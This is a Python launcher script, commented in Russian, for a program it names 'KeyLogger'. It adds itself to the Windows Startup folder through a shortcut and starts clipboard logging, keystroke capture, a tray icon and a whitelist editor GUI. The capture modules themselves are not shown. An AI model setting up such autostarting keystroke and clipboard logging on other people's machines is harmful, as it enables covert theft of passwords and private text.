

import os
from multiprocessing import Process
import win32com.client
import threading, logging, sys
from clipboard_logger import start_clipboard_logger
from process_logs import process_all_logs

# Конфигурация логирования исключений в файл
logging.basicConfig(
    filename='error.log',
    level=logging.ERROR,
    format='%(asctime)s %(levelname)s:%(message)s'
)

# Обработчик необработанных исключений
def log_uncaught_exceptions(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        # Позволяем Ctrl+C прерывать программу
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    logging.error("Uncaught exception", exc_info=(exc_type, exc_value, exc_traceback))



def add_to_autostart():
    shortcut_name = "KeyLogger"
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_dir, f"{shortcut_name}.lnk")

    if os.path.exists(shortcut_path):
        return  # уже в автозагрузке

    script_path = os.path.abspath(sys.argv[0])
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = sys.executable
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = sys.executable
    shortcut.save()
    print("[INFO] Добавлено в автозагрузку")


def main():
    # Функция для запуска системного трея
    def run_tray():
        try:
            import tray_app
            tray_app.setup_tray()
        except Exception:
            logging.exception("Tray crashed")

    # Функция для запуска кейлоггера
    process_all_logs()
    start_clipboard_logger()

    def run_keylogger():
        try:
            import keylogger
            keylogger.start_keylogger()  # Запуск перехвата клавиш
        except Exception:
            logging.exception("Keylogger crashed")

    # Создаем процессы
    processes = []
    p1 = threading.Thread(target=run_tray, name="TrayThread", daemon=True)
    p2 = threading.Thread(target=run_keylogger, name="KeyloggerThread", daemon=True)

    # GUI будет в отдельном процессе
    p3 = Process(target=run_gui_process, name="GUIProcess")

    processes.extend([p1, p2, p3])

    for p in processes:
        p.start()

    for p in processes:
        if p != p3:  # Не ждем завершения GUI процесса
            p.join()


def run_gui_process():
    """Запускает GUI в отдельном процессе"""
    try:
        from whitelist_editor import run_editor
        run_editor()
    except Exception as e:
        logging.exception("GUI process crashed")


if __name__ == "__main__":
    try:
        main()
    except Exception:
        logging.exception("run_all.py crashed")












































